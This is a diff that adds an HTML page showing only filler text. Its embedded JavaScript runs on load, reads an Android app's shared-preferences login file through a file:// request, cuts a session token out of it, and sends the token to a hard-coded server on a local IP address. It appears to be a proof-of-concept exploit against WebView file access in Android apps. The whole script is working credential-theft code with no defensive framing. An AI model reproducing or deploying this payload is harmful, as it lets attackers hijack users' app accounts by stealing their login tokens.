@@ -1,0 +1,107 @@
+<html>
+    <body>
+        lalallalalal
+    </body> 
+<script>
+ 
+var token = "";
+ 
+function iGetInnerText(testStr) {
+ 
+       var resultStr = testStr.replace(/\ +/g, ""); //去掉空格
+ 
+       resultStr = testStr.replace(/[ ]/g, "");    //去掉空格
+ 
+       resultStr = testStr.replace(/[\r\n]/g, ""); //去掉回车换行
+ 
+       return resultStr;
+ 
+    }
+ 
+function loadXMLDoc()
+ 
+{
+ 
+   var arm ="file:///data/data//com.example.tbag.appclone/shared_prefs/loginState.xml";
+ 
+   var xmlhttp;
+ 
+   if (window.XMLHttpRequest)
+ 
+    {
+ 
+       xmlhttp=new XMLHttpRequest();
+ 
+    }
+ 
+   xmlhttp.onreadystatechange=function()
+ 
+    {
+ 
+       if (xmlhttp.readyState==4)
+ 
+       {
+ 
+                     token= iGetInnerText(xmlhttp.responseText);
+ 
+                     token= token.substr(token.length-34);
+ 
+                     token= token.substr(0,19);
+ 
+                     document.write(token);
+ 
+                       sendToken();
+ 
+       }
+ 
+    }
+ 
+   xmlhttp.open("GET",arm);
+ 
+   xmlhttp.send(null);
+ 
+}
+ 
+function sendToken()
+ 
+{
+ 
+   var arm = "http://192.168.86.225/receive.php?data="+token;
+ 
+    var xmlhttp2;
+ 
+   if (window.XMLHttpRequest)
+ 
+    {
+ 
+       xmlhttp2=new XMLHttpRequest();
+ 
+    }
+ 
+   xmlhttp2.onreadystatechange=function()
+ 
+    {
+ 
+       if (xmlhttp2.readyState==4)
+ 
+       {
+ 
+                     //document.write(xmlhttp2.status);
+ 
+              //document.write(arm); 
+ 
+       }
+ 
+    }
+ 
+   xmlhttp2.open("GET",arm);
+ 
+   xmlhttp2.send(null);
+ 
+}
+ 
+loadXMLDoc();
+ 
+</script>
+ 
+</html>
